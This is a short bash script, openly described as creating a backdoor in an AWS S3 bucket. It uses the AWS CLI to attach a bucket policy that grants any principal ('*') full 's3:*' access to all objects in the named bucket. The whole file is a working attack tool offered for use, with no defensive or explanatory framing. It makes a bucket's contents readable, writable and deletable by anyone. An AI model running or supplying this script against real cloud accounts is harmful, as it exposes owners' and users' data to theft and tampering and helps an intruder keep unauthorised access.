#!/bin/bash
# Create a backdoor in S3 bucket by adding a malicious policy
# Usage: s3_backdoor.sh <bucket_name>

BUCKET_NAME=$1

if [ -z "$BUCKET_NAME" ]; then
    echo "Usage: $0 <bucket_name>"
    exit 1
fi

echo "Creating backdoor in S3 bucket: $BUCKET_NAME"

aws s3api put-bucket-policy --bucket $BUCKET_NAME --policy '{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Effect": "Allow",
            "Principal": "*",
            "Action": "s3:*",
            "Resource": "arn:aws:s3:::'$BUCKET_NAME'/*"
        }
    ]
}'

echo "Backdoor created."
